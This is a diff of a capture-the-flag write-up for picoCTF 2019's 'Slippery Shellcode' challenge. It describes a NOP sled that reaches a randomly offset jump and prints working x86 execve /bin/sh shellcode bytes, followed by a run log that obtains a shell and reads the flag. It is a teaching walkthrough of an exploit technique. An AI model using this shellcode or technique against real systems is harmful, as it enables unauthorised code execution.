@@ -1,7 +1,7 @@
 # Slippery Shellcode
 
 Looking at the source code we see that after taking the input the program starts execution from a random address
-```
+```c
 puts("Thanks! Executing from a random location now...");
   int offset = (rand() % 256) + 1;
   ((void (*)())(buf+offset))();
@@ -12,7 +12,7 @@ we just add a bunch of \x90's before our shellcode (around 200 )
 ```
 NOP or N.O.P. may refer to: NOP (code), an assembly language instruction etc. that effectively does nothing at all.
 ```
-and here is our classic shellcode
+So when the instruction pointer lands on the '/x90' instruction it executes it (which does nothing) and makes its way to our shellcode
 
 ```
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
@@ -20,7 +20,7 @@ and here is our classic shellcode
 
 use ```io.interactive()``` or ``` ; cat ``` after the payload to get the shell to persist 
 
-```
+```bash
 arch3r@1nv4d3r:~/p1c0CTF_2019/Shellc0d3$ python exploit.py 
 [+] Starting local process './vuln': pid 30701
 [*] Switching to interactive mode
@@ -31,3 +31,4 @@ exploit.py  flag.txt  vuln  vuln.c
 $ cat flag.txt
 flag{Sh3llc0dee!}
 ```
+..aand here's our shell..!!
